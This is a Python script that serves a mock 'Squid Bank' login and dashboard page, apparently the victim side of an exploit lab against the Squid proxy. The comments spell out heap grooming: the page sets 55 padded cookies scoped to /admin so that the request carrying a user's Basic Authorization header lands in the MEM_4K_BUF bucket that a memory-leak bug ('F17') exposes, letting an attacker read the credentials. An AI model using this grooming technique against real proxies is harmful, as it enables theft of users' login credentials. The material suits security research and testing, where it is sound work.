#!/usr/bin/env python3
import http.server, socketserver, base64, json

USERS = {"alice": "i_love_c_programming"}

BOOTSTRAP_CSS = (
    '<link rel="stylesheet" '
    'href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" '
    'integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" '
    'crossorigin="anonymous">'
)

ACCOUNT_DATA = {
    "alice": {
        "user": "alice",
        "display_name": "Alice Morgan",
        "balance": "$9,999,999.00",
        "accounts": [
            {
                "name": "Everyday Checking",
                "number": "****4242",
                "balance": "$1,234,567.00",
                "available": "$1,234,567.00",
            },
            {
                "name": "High-Yield Savings",
                "number": "****8891",
                "balance": "$8,765,432.00",
                "available": "$8,765,432.00",
            },
            {
                "name": "Platinum Credit",
                "number": "****0317",
                "balance": "-$842.15",
                "available": "$24,157.85",
            },
        ],
        "transactions": [
            {"date": "Apr 16", "desc": "Whole Foods Market",   "account": "Checking ****4242", "amount": "-$142.58"},
            {"date": "Apr 15", "desc": "Payroll — ACME Corp",  "account": "Checking ****4242", "amount": "+$8,420.00"},
            {"date": "Apr 14", "desc": "Transfer to Savings",  "account": "Savings ****8891",  "amount": "+$2,000.00"},
            {"date": "Apr 13", "desc": "Con Edison",           "account": "Checking ****4242", "amount": "-$86.40"},
            {"date": "Apr 12", "desc": "Delta Air Lines",      "account": "Platinum ****0317", "amount": "-$612.30"},
            {"date": "Apr 11", "desc": "Interest earned",      "account": "Savings ****8891",  "amount": "+$317.22"},
        ],
    }
}

INDEX_HTML = ("""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Squid Bank &middot; Online Banking</title>
""" + BOOTSTRAP_CSS + """
<style>
  :root {
    --sb-ink:    #0b2540;
    --sb-brand:  #0a6e7a;
    --sb-accent: #14b8a6;
    --sb-soft:   #eef6f7;
    --sb-muted:  #6b7a8c;
  }
  body { background: var(--sb-soft); color: var(--sb-ink); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
  .navbar-sb { background: var(--sb-ink); }
  .navbar-sb .navbar-brand, .navbar-sb .nav-link, .navbar-sb .navbar-text { color: #fff !important; }
  .navbar-sb .nav-link { opacity: .85; }
  .navbar-sb .nav-link:hover { opacity: 1; }
  .sb-logo {
    display: inline-flex; align-items: center; gap: .55rem;
    font-weight: 700; letter-spacing: -0.01em;
  }
  .sb-logo-mark {
    width: 32px; height: 32px; border-radius: 8px;
    background: linear-gradient(135deg, var(--sb-accent), var(--sb-brand));
    display: inline-flex; align-items: center; justify-content: center;
    color: #fff; font-weight: 800;
  }
  .btn-sb { background: var(--sb-brand); color: #fff; border: 0; }
  .btn-sb:hover, .btn-sb:focus { background: #0b5c67; color: #fff; }
  .card-sb { border: 0; box-shadow: 0 1px 2px rgba(15,23,42,.06), 0 8px 24px rgba(15,23,42,.06); border-radius: 14px; }
  .hero-balance {
    background: linear-gradient(135deg, #0b2540 0%, #0a6e7a 100%);
    color: #fff; border-radius: 14px;
  }
  .hero-balance .label { text-transform: uppercase; letter-spacing: .08em; font-size: .78rem; opacity: .8; }
  .hero-balance .amount { font-weight: 700; letter-spacing: -0.02em; }
  .account-tile { border: 1px solid #e5edf0; border-radius: 12px; padding: 1rem 1.1rem; background: #fff; height: 100%; }
  .account-tile .acct-name { font-weight: 600; }
  .account-tile .acct-num  { color: var(--sb-muted); font-size: .875rem; }
  .account-tile .acct-bal  { font-size: 1.35rem; font-weight: 700; }
  .tx-row { display: flex; justify-content: space-between; align-items: center; padding: .65rem 0; border-bottom: 1px solid #eef2f5; }
  .tx-row:last-child { border-bottom: 0; }
  .tx-desc { font-weight: 500; }
  .tx-meta { color: var(--sb-muted); font-size: .82rem; }
  .tx-amt.neg { color: #b42318; }
  .tx-amt.pos { color: #067647; font-weight: 600; }
  .quick-btn { border: 1px solid #dbe3e8; background: #fff; border-radius: 12px; padding: .9rem; width: 100%; text-align: left; transition: transform .08s ease, box-shadow .15s ease; }
  .quick-btn:hover { transform: translateY(-1px); box-shadow: 0 6px 16px rgba(15,23,42,.08); }
  .quick-btn .ic { width: 36px; height: 36px; border-radius: 10px; background: var(--sb-soft); color: var(--sb-brand); display:inline-flex; align-items:center; justify-content:center; font-weight:700; margin-right: .6rem; }
  .footer-sb { color: var(--sb-muted); font-size: .82rem; }
  .login-wrap { min-height: calc(100vh - 120px); }
  .login-card .brand-row { display:flex; align-items:center; gap:.6rem; margin-bottom: 1rem; }
</style>
</head>
<body>
<nav class="navbar navbar-sb navbar-expand-lg py-3">
  <div class="container">
    <span class="navbar-brand sb-logo mb-0">
      <span class="sb-logo-mark">S</span>
      <span>Squid Bank</span>
    </span>
    <div class="d-none d-lg-flex gap-4 me-auto ms-4">
      <a class="nav-link" href="#">Accounts</a>
      <a class="nav-link" href="#">Transfers</a>
      <a class="nav-link" href="#">Payments</a>
      <a class="nav-link" href="#">Cards</a>
    </div>
    <span class="navbar-text" id="whoami"></span>
  </div>
</nav>

<main class="container py-4 py-lg-5">
  <div id="login-view" class="login-wrap align-items-center justify-content-center row d-none">
    <div class="col-md-6 col-lg-4">
      <div class="card card-sb login-card">
        <div class="card-body p-4 p-lg-5">
          <div class="brand-row">
            <span class="sb-logo-mark">S</span>
            <div>
              <div class="fw-bold">Squid Bank</div>
              <div class="text-muted small">Online Banking</div>
            </div>
          </div>
          <h1 class="h4 mb-1">Sign in</h1>
          <p class="text-muted mb-4">Access your accounts securely.</p>
          <div id="login-error" class="alert alert-danger d-none" role="alert"></div>
          <form id="login-form" novalidate>
            <div class="mb-3">
              <label for="username" class="form-label">Username</label>
              <input type="text" class="form-control form-control-lg" id="username"
                     autocomplete="username" required>
            </div>
            <div class="mb-3">
              <label for="password" class="form-label d-flex justify-content-between">
                <span>Password</span>
                <a href="#" class="small text-decoration-none">Forgot?</a>
              </label>
              <input type="password" class="form-control form-control-lg" id="password"
                     autocomplete="current-password" required>
            </div>
            <div class="form-check mb-3">
              <input class="form-check-input" type="checkbox" id="remember">
              <label class="form-check-label" for="remember">Remember this device</label>
            </div>
            <button type="submit" class="btn btn-sb btn-lg w-100">Sign in</button>
          </form>
        </div>
        <div class="card-footer bg-white text-center footer-sb py-3">
          Protected by 256-bit TLS &middot; FDIC Insured
        </div>
      </div>
    </div>
  </div>

  <div id="dashboard-view" class="d-none">
    <div class="d-flex justify-content-between align-items-end mb-3">
      <div>
        <div class="text-muted small">Welcome back</div>
        <h1 class="h3 mb-0" id="dash-user">&nbsp;</h1>
      </div>
      <button id="logout-btn" class="btn btn-outline-secondary btn-sm">Sign out</button>
    </div>

    <div class="row g-3 mb-4">
      <div class="col-lg-5">
        <div class="hero-balance p-4 h-100">
          <div class="label">Total balance</div>
          <div class="amount display-5" id="dash-balance">&hellip;</div>
          <div class="small mt-1" style="opacity:.8">Across all accounts &middot; updated just now</div>
        </div>
      </div>
      <div class="col-lg-7">
        <div class="row g-3 h-100">
          <div class="col-6 col-md-3">
            <button class="quick-btn h-100"><span class="ic">&#8644;</span><div class="fw-semibold small mt-1">Transfer</div></button>
          </div>
          <div class="col-6 col-md-3">
            <button class="quick-btn h-100"><span class="ic">&#128179;</span><div class="fw-semibold small mt-1">Pay bill</div></button>
          </div>
          <div class="col-6 col-md-3">
            <button class="quick-btn h-100"><span class="ic">&#43;</span><div class="fw-semibold small mt-1">Deposit</div></button>
          </div>
          <div class="col-6 col-md-3">
            <button class="quick-btn h-100"><span class="ic">&#9776;</span><div class="fw-semibold small mt-1">More</div></button>
          </div>
        </div>
      </div>
    </div>

    <div class="row g-3 mb-4">
      <div class="col-12">
        <h2 class="h5 mb-3">Your accounts</h2>
      </div>
      <div id="dash-accounts" class="col-12">
        <div class="row g-3"></div>
      </div>
    </div>

    <div class="row g-3">
      <div class="col-lg-8">
        <div class="card card-sb">
          <div class="card-body p-4">
            <div class="d-flex justify-content-between align-items-center mb-3">
              <h2 class="h5 mb-0">Recent activity</h2>
              <a href="#" class="small text-decoration-none">View all</a>
            </div>
            <div id="dash-tx"></div>
          </div>
        </div>
      </div>
      <div class="col-lg-4">
        <div class="card card-sb h-100">
          <div class="card-body p-4">
            <h2 class="h5 mb-3">Messages</h2>
            <p class="text-muted small mb-0">You have no new messages. Your next statement will be available on the 1st.</p>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div id="loading-view" class="row justify-content-center py-5">
    <div class="col-auto">
      <div class="spinner-border text-secondary" role="status">
        <span class="visually-hidden">Loading&hellip;</span>
      </div>
    </div>
  </div>
</main>

<footer class="container py-4 footer-sb">
  <div class="d-flex justify-content-between flex-wrap gap-2">
    <div>&copy; Squid Bank, N.A. &middot; Member FDIC &middot; Equal Housing Lender</div>
    <div>
      <a href="#" class="text-decoration-none me-3">Privacy</a>
      <a href="#" class="text-decoration-none me-3">Security</a>
      <a href="#" class="text-decoration-none">Help</a>
    </div>
  </div>
</footer>

<script>
// Set a realistic analytics cookie jar via document.cookie rather than
// Set-Cookie. Two reasons:
//   1) Path=/admin scopes them to the XHR endpoint only — other requests
//      (GET /, favicon, etc.) stay small and don't pollute MEM_4K_BUF.
//   2) Keeping them OUT of the Set-Cookie header on GET / makes that
//      response's header block tiny, so Squid's upstream-response reads
//      don't fill 4K blocks with Set-Cookie bytes that would then
//      dominate the freelist and bury the XHR's Authorization buffer.
(function setJar() {
  for (let i = 0; i < 55; i++) {
    const n = String(i).padStart(2, "0");
    document.cookie = "_ga_" + n + "=GS1.1.AAAAAAAAAAAAAA." + i + ".BBBBBBBBBB; path=/admin; SameSite=Lax";
  }
})();
const LOGIN_KEY = "squidbank_auth";
const $ = (id) => document.getElementById(id);
const els = {
  login:     $("login-view"),
  dashboard: $("dashboard-view"),
  loading:   $("loading-view"),
  form:      $("login-form"),
  user:      $("username"),
  pass:      $("password"),
  err:       $("login-error"),
  whoami:    $("whoami"),
  dashUser:  $("dash-user"),
  dashBal:   $("dash-balance"),
  dashAccts: $("dash-accounts"),
  dashTx:    $("dash-tx"),
  logout:    $("logout-btn"),
};

function show(view) {
  ["login","dashboard","loading"].forEach(k => els[k].classList.add("d-none"));
  els[view].classList.remove("d-none");
}

function showError(msg) {
  els.err.textContent = msg;
  els.err.classList.remove("d-none");
}

async function fetchBalance(auth) {
  const r = await fetch("/admin/accounts", {
    headers: {
      "Authorization": "Basic " + auth,
      "Accept": "application/json",
    },
  });
  if (r.status === 401) {
    sessionStorage.removeItem(LOGIN_KEY);
    throw new Error("Invalid username or password");
  }
  if (!r.ok) throw new Error("We couldn't reach your accounts. Please try again.");
  return r.json();
}

function renderAccounts(list) {
  const row = els.dashAccts.querySelector(".row");
  row.innerHTML = "";
  for (const a of list) {
    const col = document.createElement("div");
    col.className = "col-md-6 col-lg-4";
    const tile = document.createElement("div");
    tile.className = "account-tile";
    const name = document.createElement("div");
    name.className = "acct-name";
    name.textContent = a.name;
    const num = document.createElement("div");
    num.className = "acct-num mb-2";
    num.textContent = a.number;
    const bal = document.createElement("div");
    bal.className = "acct-bal";
    bal.textContent = a.balance;
    const avail = document.createElement("div");
    avail.className = "acct-num";
    avail.textContent = a.available ? ("Available " + a.available) : "";
    tile.appendChild(name);
    tile.appendChild(num);
    tile.appendChild(bal);
    if (a.available) tile.appendChild(avail);
    col.appendChild(tile);
    row.appendChild(col);
  }
}

function renderTransactions(list) {
  els.dashTx.innerHTML = "";
  if (!list || !list.length) {
    const p = document.createElement("p");
    p.className = "text-muted small mb-0";
    p.textContent = "No recent activity.";
    els.dashTx.appendChild(p);
    return;
  }
  for (const t of list) {
    const row = document.createElement("div");
    row.className = "tx-row";
    const left = document.createElement("div");
    const desc = document.createElement("div");
    desc.className = "tx-desc";
    desc.textContent = t.desc;
    const meta = document.createElement("div");
    meta.className = "tx-meta";
    meta.textContent = t.date + " \u00b7 " + t.account;
    left.appendChild(desc);
    left.appendChild(meta);
    const amt = document.createElement("div");
    const isPos = typeof t.amount === "string" && t.amount.trim().startsWith("+");
    amt.className = "tx-amt " + (isPos ? "pos" : "neg");
    amt.textContent = t.amount;
    row.appendChild(left);
    row.appendChild(amt);
    els.dashTx.appendChild(row);
  }
}

function renderDashboard(data) {
  const name = data.display_name || data.user;
  els.whoami.innerHTML = "Signed in as <strong></strong>";
  els.whoami.querySelector("strong").textContent = name;
  els.dashUser.textContent = name;
  els.dashBal.textContent = data.balance;
  renderAccounts(data.accounts || []);
  renderTransactions(data.transactions || []);
  show("dashboard");
}

async function tryAuth(auth) {
  show("loading");
  try {
    const data = await fetchBalance(auth);
    sessionStorage.setItem(LOGIN_KEY, auth);
    renderDashboard(data);
  } catch (e) {
    els.whoami.textContent = "";
    show("login");
    showError(e.message);
  }
}

els.form.addEventListener("submit", (ev) => {
  ev.preventDefault();
  els.err.classList.add("d-none");
  const auth = btoa(els.user.value + ":" + els.pass.value);
  tryAuth(auth);
});

els.logout.addEventListener("click", () => {
  sessionStorage.removeItem(LOGIN_KEY);
  els.user.value = "";
  els.pass.value = "";
  els.whoami.textContent = "";
  show("login");
});

(function init() {
  const saved = sessionStorage.getItem(LOGIN_KEY);
  if (saved) tryAuth(saved); else show("login");
})();
</script>
</body>
</html>
""").encode()


# Realistic-looking analytics/session cookies. Firefox stores these from
# the initial GET / response, then echoes them back on every subsequent
# request to this origin — including the XHR to /admin/accounts, which
# has Alice's Authorization: Basic header. The extra ~1600 bytes of
# Cookie: pushes that XHR's request size from ~600 B into the 2049-4096
# B MEM_4K_BUF bucket that F17 leaks from.
#
# IMPORTANT: we set these ONLY on the /  response, not on /admin/accounts.
# If the XHR response also carried 55 Set-Cookies, the upstream-response
# churn in MEM_4K_BUF (Squid reads response chunks into 4K blocks) would
# bury the request buffer on the freelist before the attacker's listing
# alloc samples it — and we'd only leak cookies from the response, not
# the Authorization header from the request.
PAD_COOKIES = [
    (f"_ga_{i:02d}", f"GS1.1.{'A'*14}.{i}.{'B'*10}")
    for i in range(55)
]

def _send(handler, status, body, ctype, extra_headers=(), pad_cookies=False):
    handler.send_response(status)
    handler.send_header("Content-Type", ctype)
    handler.send_header("Content-Length", str(len(body)))
    handler.send_header("Cache-Control", "no-store")
    if pad_cookies:
        for name, value in PAD_COOKIES:
            handler.send_header("Set-Cookie", f"{name}={value}; Path=/; SameSite=Lax")
    for k, v in extra_headers:
        handler.send_header(k, v)
    handler.end_headers()
    handler.wfile.write(body)


class H(http.server.BaseHTTPRequestHandler):
    server_version = "SquidBank/1.0"
    sys_version = ""

    def log_message(self, *a): pass

    def _authorized_user(self):
        auth = self.headers.get("Authorization", "")
        if not auth.startswith("Basic "):
            return None
        try:
            u, p = base64.b64decode(auth[6:]).decode().split(":", 1)
        except Exception:
            return None
        if USERS.get(u) != p:
            return None
        return u

    def do_GET(self):
        path = self.path.split("?", 1)[0]

        if path == "/admin/accounts":
            user = self._authorized_user()
            if user is None:
                body = json.dumps({"error": "unauthorized"}).encode()
                _send(self, 401, body, "application/json",
                      extra_headers=[("WWW-Authenticate", 'Basic realm="Squid Bank"')])
                return
            data = ACCOUNT_DATA.get(user, {"user": user, "balance": "$0.00", "accounts": [], "transactions": []})
            _send(self, 200, json.dumps(data).encode(), "application/json")
            return

        # Cookie jar is set in the HTML via document.cookie, not Set-Cookie —
        # keeps this response's header block small so it doesn't fill 4K
        # response buffers with leakable Set-Cookie bytes.
        _send(self, 200, INDEX_HTML, "text/html; charset=utf-8")


socketserver.ThreadingTCPServer.allow_reuse_address = True
with socketserver.ThreadingTCPServer(("0.0.0.0", 7777), H) as srv:
    print("[app] Squid Bank on 0.0.0.0:7777", flush=True)
    srv.serve_forever()
